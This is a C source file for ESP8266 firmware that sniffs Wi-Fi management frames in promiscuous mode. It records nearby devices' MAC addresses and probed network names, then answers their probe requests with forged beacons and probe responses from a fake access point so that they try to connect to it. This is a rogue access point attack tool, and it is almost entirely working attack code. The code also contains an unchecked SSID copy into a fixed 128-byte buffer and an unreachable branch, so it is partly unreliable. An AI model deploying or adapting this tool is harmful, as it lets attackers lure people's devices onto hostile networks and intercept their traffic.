#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "mem.h"
#include "user_interface.h"
#include "driver/uart.h"
#include "packetforge.h"

#define user_procTaskPrio        0
#define user_procTaskQueueLen    1
os_event_t    user_procTaskQueue[user_procTaskQueueLen];

#define CONFIG_DOGMA 1
#define CHANNEL_HOP_INTERVAL 60000
uint8_t channel = 6;
uint16_t seq_n = 0;
uint8_t packet_buffer[64];
static volatile os_timer_t chanhop_timer;

#define TYPE_MANAGEMENT       0x00
#define TYPE_CONTROL          0x01
#define TYPE_DATA             0x02
#define SUBTYPE_ASSOC_REQUEST 0x00
#define SUBTYPE_PROBE_RESPONSE 0x05
#define SUBTYPE_PROBE_REQUEST 0x04

// we "win" when we're able to try to connect
// to forge_ap.
uint8_t forge_ap[6] = {0x11,0x22,0x33,0x44,0x55,0x66};

/* ==============================================
 * Promiscous callback structures, see ESP manual
 * ============================================== */
 
struct RxControl {
    signed rssi:8;
    unsigned rate:4;
    unsigned is_group:1;
    unsigned:1;
    unsigned sig_mode:2;
    unsigned legacy_length:12;
    unsigned damatch0:1;
    unsigned damatch1:1;
    unsigned bssidmatch0:1;
    unsigned bssidmatch1:1;
    unsigned MCS:7;
    unsigned CWB:1;
    unsigned HT_length:16;
    unsigned Smoothing:1;
    unsigned Not_Sounding:1;
    unsigned:1;
    unsigned Aggregation:1;
    unsigned STBC:2;
    unsigned FEC_CODING:1;
    unsigned SGI:1;
    unsigned rxend_state:8;
    unsigned ampdu_cnt:8;
    unsigned channel:4;
    unsigned:12;
};
 
struct LenSeq {
    uint16_t length;
    uint16_t seq;
    uint8_t  address3[6];
};

struct sniffer_buf {
    struct RxControl rx_ctrl;
    uint8_t buf[36];
    uint16_t cnt;
    struct LenSeq lenseq[1];
};

struct sniffer_buf2{
    struct RxControl rx_ctrl;
    uint8_t buf[112];
    uint16_t cnt;
    uint16_t len;
};

/* Listens communication between AP and client */
static void ICACHE_FLASH_ATTR
promisc_cb(uint8_t *buf, uint16_t len)
{
    if (len == 12){
        struct RxControl *sniffer = (struct RxControl*) buf;
    } else if (len != 128) {
        struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
    } 
    else {
        if(len > 300)
        {
          os_printf(">300 data packet\n");
        }
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
        unsigned int frameControl = ((unsigned int)sniffer->buf[1] << 8) + sniffer->buf[0];
        unsigned int version      = (frameControl & 0b0000000000000011) >> 0;
        unsigned int frameType    = (frameControl & 0b0000000000001100) >> 2;
        unsigned int frameSubType = (frameControl & 0b0000000011110000) >> 4;
        unsigned int toDS         = (frameControl & 0b0000000100000000) >> 8;
        unsigned int fromDS       = (frameControl & 0b0000001000000000) >> 9;
        int i=0;
        // os_printf("FC:%04x :: %02x:%02x\n",frameControl,frameType,frameSubType);
        if(frameType == TYPE_MANAGEMENT && frameSubType == SUBTYPE_ASSOC_REQUEST)
        {
            i = 0;
            os_printf("ASSOCIATE REQUEST to %02x:%02x:%02x:%02x:%02x:%02x\n",sniffer->buf[i+4],sniffer->buf[i+5],sniffer->buf[i+6],sniffer->buf[i+7],sniffer->buf[i+8],sniffer->buf[i+9]);
            uint16_t seqnPacket = (((unsigned int)sniffer->buf[23] << 8) + sniffer->buf[22] ) >> 4;
            uint16_t newSeqnPacket = ((seqnPacket + 1) << 4) & 0xFFF0;
            // assocresp(sniffer->buf+10,newSeqnpacket);
        }
	      else if(frameType == TYPE_MANAGEMENT && frameSubType == SUBTYPE_PROBE_REQUEST)
	      {
          // todo: robustness.
          if(sniffer->buf[0x19] == 0)
          {
            i = 6;
            os_printf("BROADCAST PROBE from %02x:%02x:%02x:%02x:%02x:%02x\n",sniffer->buf[i+4],sniffer->buf[i+5],sniffer->buf[i+6],sniffer->buf[i+7],sniffer->buf[i+8],sniffer->buf[i+9]);
            uint16_t seqnPacket = (((unsigned int)sniffer->buf[23] << 8) + sniffer->buf[22] ) >> 4;
            uint16_t newSeqnPacket = ((seqnPacket + 1) << 4) & 0xFFF0;
            beaconPNL(sniffer->buf + 10,newSeqnPacket,channel);
          }
          else{
            char *pkt_buf = (char *)os_malloc(256);
	          char *beacon_buf = (char *)os_malloc(256);
            char *ssid = (char *)os_malloc(128);
            uint8_t ssidLength = sniffer->buf[i+0x19];
            int x = 0;
            for(x = 0;x < sniffer->buf[i+0x19];x++)
            {
              ssid[x] = sniffer->buf[i+0x1a+x];
            }
            i = 6;
            uint16_t seqnPacket = (((unsigned int)sniffer->buf[23] << 8) + sniffer->buf[22] ) >> 4;
            uint16_t newSeqnPacket = ((seqnPacket + 1) << 4) & 0xFFF0;
            uint16_t probeRespSize = proberesp(pkt_buf,(sniffer->buf + 10),forge_ap,newSeqnPacket,ssidLength,ssid,channel);
            uint16_t beaconRespSize = beaconresp(beacon_buf,(sniffer->buf + 10),forge_ap,newSeqnPacket,ssidLength,ssid,channel);
            ssid[x] = 0;
            storePNL(sniffer->buf + 10,ssid,ssidLength);
            os_printf("DIRECTED PROBE REQUEST from %02x:%02x:%02x:%02x:%02x:%02x (SSID:%s) (SEQN:%d)\n",sniffer->buf[i+4],sniffer->buf[i+5],sniffer->buf[i+6],sniffer->buf[i+7],sniffer->buf[i+8],sniffer->buf[i+9],ssid,seqnPacket);
            int repeatSend = 0;
            if(CONFIG_DOGMA == 1)
            {
              int retval = wifi_send_pkt_freedom(beacon_buf,beaconRespSize,0);
              if (retval != 0)
              {
                os_printf("beacon fail\n");
              }
              else
              {
                os_printf("beacon ok\n");
              }
            }
            int retval = wifi_send_pkt_freedom(pkt_buf,probeRespSize,0);
            if (retval != 0)
            {
              os_printf("probe response fail\n");
            }
            os_free(pkt_buf);
            os_free(ssid);
            os_free(beacon_buf);
          }
        }
        else if(frameType == TYPE_MANAGEMENT && frameSubType == SUBTYPE_PROBE_RESPONSE)
        {
          if(sniffer->buf[24] != 0)
          {
            // lol
            i = 0;
            saveForgedTimestamp(sniffer->buf + 24);
            // for(i = 0;i < 8;i++) forge_timestamp[i] = sniffer->buf[24+i];
          }
        }
    }
}

void ICACHE_FLASH_ATTR
sniffer_system_init_done(void)
{
    // Set up promiscuous callback
    wifi_set_channel(channel);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
}

void channelhop(void *arg)
{
    channel = 1 + ((channel + 2) % 12);
    os_printf("Hopping to channel %d\n", channel);
    wifi_set_channel(channel);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
}

void ICACHE_FLASH_ATTR
user_init()
{
    uart_init(115200, 115200);
    os_printf("\n\n*** TO ASHES ***\n\n");

    initPNL();
    wifi_set_opmode(STATION_MODE);
    // uncomment to channel hop
    /*
    os_timer_disarm(&chanhop_timer);
    os_timer_setfn(&chanhop_timer, (os_timer_func_t *) channelhop, NULL);
    os_timer_arm(&chanhop_timer, CHANNEL_HOP_INTERVAL, 1);
    */
    system_init_done_cb(sniffer_system_init_done);
}
